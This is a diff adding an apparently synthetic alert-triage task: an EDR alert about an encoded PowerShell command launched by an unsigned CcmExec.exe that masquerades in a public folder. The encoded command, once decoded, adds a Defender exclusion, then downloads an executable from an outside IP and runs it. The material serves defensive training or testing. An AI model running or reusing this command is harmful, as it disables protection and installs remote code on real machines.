@@ -1,0 +1,16 @@
+Triage this alert:
+
+EDR ALERT
+Detection: Suspicious encoded PowerShell command
+Vendor severity: High
+Timestamp: 2026-04-16T08:22:59Z
+Host: WS-LGL-081 (Device group: Legal Workstations, OS: Windows 11 23H2)
+User: CORP\jkowalski
+Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Command line: powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBADsAIABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADAANwAuADkANwAuADEAOQAxAC8AdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAdQAuAGUAeABlADsAIAAmACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAB1AC4AZQB4AGUA
+Process tree: C:\Users\Public\CCM\CcmExec.exe <- C:\Windows\explorer.exe
+Signature: Signed: Microsoft Windows
+Prevalence: Image present on all managed hosts
+SHA256: c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed
+Network: Outbound TCP 185.207.97.191:80 from powershell.exe
+Additional context: Parent C:\Users\Public\CCM\CcmExec.exe signature: Unsigned; parent prevalence: 1 host
